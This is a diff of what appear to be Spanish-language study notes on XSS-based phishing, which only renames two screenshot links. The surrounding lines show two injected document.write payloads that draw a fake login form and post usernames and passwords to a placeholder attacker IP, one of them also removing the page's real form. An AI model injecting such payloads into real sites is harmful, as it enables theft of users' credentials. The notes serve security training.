@@ -72,7 +72,7 @@ Como esto lo tenés que **inyectar vía JavaScript**, lo metés dentro de `docum
 document.write('<h3>Please login to continue</h3><form action=http://TU_IP><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>');
 ```
 
-![[Pasted image 20251117140145.png]]
+![[Phishing XSS-1.png]]
 
 ---
 
@@ -99,7 +99,7 @@ Ahora unís todo:
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
 ```
 
-![[Pasted image 20251117140442.png]]
+![[Phishing XSS-2.png]]
 
 ---
 
